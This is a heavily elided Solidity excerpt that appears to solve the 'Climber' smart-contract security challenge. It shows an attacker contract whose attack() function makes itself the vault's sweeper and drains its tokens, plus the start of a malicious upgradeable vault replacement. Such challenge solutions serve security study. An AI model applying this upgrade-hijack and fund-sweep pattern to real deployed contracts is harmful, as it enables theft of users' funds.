...
contract AttackClimberTimelock {
	...
	constructor (address _vaultAddr, address payable _timelockAddr, address _tokenAddr, address _ownerAddr) {

		vault = _vaultAddr;
		timelock = _timelockAddr;
		token = _tokenAddr;
		owner = _ownerAddr;
	}
	...
	function attack() external {
		...
		AttackClimberVault(vault)._setSweeper(address(this));
		AttackClimberVault(vault).sweepFunds(token);
	}
...
contract AttackClimberVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
